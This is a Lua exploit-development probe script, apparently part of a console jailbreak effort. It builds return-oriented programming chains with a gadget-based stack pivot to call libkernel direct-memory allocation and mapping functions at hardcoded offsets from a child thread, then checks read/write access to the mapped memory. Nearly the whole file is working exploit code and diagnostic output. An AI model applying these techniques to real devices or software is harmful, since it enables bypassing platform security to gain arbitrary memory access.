-- CRASH_CLASS: MODERATE
-- PROBE 544e: MapDirectMemory with REAL allocated physical address
--
-- 544d proved: AllocDM works from main thread (fcall_with_rax), fails from child.
-- 544c: MapDM crashed from child thread — maybe because phys wasn't allocated?
--
-- New plan:
-- 1. AllocDM from MAIN thread via fcall_with_rax → get valid phys addr
-- 2. MapDM from CHILD thread via manual 7-arg stub → map the allocated phys
-- 3. If child still crashes, try MapDM from main thread using a different
--    approach for the 7th arg (e.g., pre-written stack frame)

print("=== PROBE 544e: MapDM WITH REAL ALLOC ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end

if not libkernel_base then print("FATAL: no libkernel_base"); return end
print("libkernel=" .. q(libkernel_base))
print("pid=" .. to_num(syscall.getpid()))

local map_fn = libkernel_base + uint64(0x15020)
local alloc_fn = libkernel_base + uint64(0x17EF0)

-- [A] AllocDM from main thread
print("")
print("[A] AllocDM (main thread)")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, alloc_rv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys_addr = rq(phys_out)
local arv = ok_a and to_num(alloc_rv) or -1
print("  rv=" .. arv .. " phys=" .. q(phys_addr))

if arv ~= 0 or not phys_addr or to_num(phys_addr) == 0 then
    print("  FATAL: AllocDM failed")
    return
end
print("  *** AllocDM OK ***")

-- [B] MapDM from child thread with manual 7-arg stub
print("")
print("[B] MapDM (child thread, 7-arg stub)")

local virt_out = memory.alloc(8)
wq(virt_out, uint64(0))
local custom_stub = memory.alloc(0x100)
for off = 0, 0xFC, 4 do wd(custom_stub + off, 0) end

-- Measure the exact sizes we need
local m_chain = ropchain({ stack_size = 0x1000 })
local m0 = m_chain:get_rsp()
m_chain:push_write_qword_memory(uint64(0x1000), 0)
local write_size = to_num(m_chain:get_rsp()) - to_num(m0)
m0 = m_chain:get_rsp()
m_chain:push_set_rsp(uint64(0))
local pivot_size = to_num(m_chain:get_rsp()) - to_num(m0)
print("  write_size=" .. write_size .. " pivot_size=" .. pivot_size)

local chain = ropchain({
    fcall_stub_padding_size = 0x50000,
    stack_size = 0x8000
})

-- Write custom stub slots
chain:push_write_qword_memory(custom_stub + uint64(0x00), map_fn)
chain:push_write_qword_memory(custom_stub + uint64(0x08), gadgets["pop rbx; ret"])
chain:push_write_qword_memory(custom_stub + uint64(0x10), 0) -- 7th arg = name = NULL
chain:push_write_qword_memory(custom_stub + uint64(0x18), gadgets["pop rsp; ret"])

-- Set 6 register args
chain:push_sysv(
    uint64(virt_out),      -- rdi: &virtAddr
    uint64(0x4000),        -- rsi: length
    uint64(3),             -- rdx: PROT_READ|PROT_WRITE
    uint64(0),             -- rcx: flags
    phys_addr,             -- r8: physical address (from AllocDM!)
    uint64(0x4000)         -- r9: alignment
)

-- Write resume addr + pivot
local resume_addr = chain:get_rsp() + uint64(write_size + pivot_size)
chain:push_write_qword_memory(custom_stub + uint64(0x20), resume_addr)
chain:push_set_rsp(custom_stub)

-- RESUME: store retval
chain:push_store_retval()

-- Verify
print("  resume=" .. q(resume_addr))

local ok_mt, map_thr = pcall(function() return thread:new(chain) end)
if not ok_mt then print("  thread:new FAIL"); return end

print("  running...")
local ok_mr, err_mr = pcall(function() map_thr:run(true) end)
print("  run ok=" .. tostring(ok_mr) .. " err=" .. tostring(err_mr))

if ok_mr then
    pcall(function() map_thr:join() end)
    local map_rv = rq(chain:get_last_retval_addr())
    local virt_addr = rq(virt_out)
    print("  map_rv=" .. q(map_rv))
    print("  virt=" .. q(virt_addr))

    if map_rv and to_num(map_rv) == 0 and virt_addr and to_num(virt_addr) ~= 0 then
        print("  *** MapDM SUCCEEDED ***")
        pcall(function() memory.write_dword(virt_addr, 0xDEADBEEF) end)
        local rb = rd(to_num(virt_addr))
        if rb then
            if rb < 0 then rb = rb + 0x100000000 end
            print(string.format("  R/W: wrote 0xDEADBEEF read 0x%08X", rb))
        end
    else
        print("  MapDM FAILED from child thread")
    end
else
    print("  child thread CRASHED")
end

-- [C] If child crashed, try a SIMPLER test: call a known-working
-- libkernel function from the child to verify the thread works at all
print("")
print("[C] child thread sanity: AllocDM from child")
local phys_out3 = memory.alloc(8)
wq(phys_out3, uint64(0))

local chain3 = ropchain({ fcall_stub_padding_size = 0x50000 })
chain3:push_fcall_with_ret(alloc_fn,
    uint64(0), uint64("0x150000000"), uint64(0x4000),
    uint64(0x4000), uint64(0), uint64(phys_out3)
)
local ok_t3, thr3 = pcall(function() return thread:new(chain3) end)
if ok_t3 then
    local ok_r3 = pcall(function() thr3:run(true) end)
    print("  run ok=" .. tostring(ok_r3))
    if ok_r3 then
        pcall(function() thr3:join() end)
        local rv3 = rq(chain3:get_last_retval_addr())
        local p3 = rq(phys_out3)
        print("  AllocDM rv=" .. q(rv3) .. " phys=" .. q(p3))
    else
        print("  child crashed calling AllocDM too!")
    end
end

-- [D] Even simpler: getpid from child
print("")
print("[D] child getpid")
local chain4 = ropchain({ fcall_stub_padding_size = 0x50000 })
chain4:push_fcall_with_ret(libkernel_base + uint64(0xB57), uint64(0)) -- getpid offset guess
-- Actually use syscall approach:
local sc_getpid = { syscall_no = 20 }
for k, v in pairs(syscall.pipe) do sc_getpid[k] = sc_getpid[k] or v end
setmetatable(sc_getpid, getmetatable(syscall.pipe))
local chain5 = ropchain({ fcall_stub_padding_size = 0x50000 })
chain5:push_syscall_with_ret(sc_getpid)
local ok_t5, thr5 = pcall(function() return thread:new(chain5) end)
if ok_t5 then
    local ok_r5 = pcall(function() thr5:run(true) end)
    print("  run ok=" .. tostring(ok_r5))
    if ok_r5 then
        pcall(function() thr5:join() end)
        local rv5 = rq(chain5:get_last_retval_addr())
        print("  getpid=" .. q(rv5))
    end
end

print("")
print("canary: ok=" .. tostring(pcall(function() return syscall.getpid() end)))
print("=== 544e DONE ===")
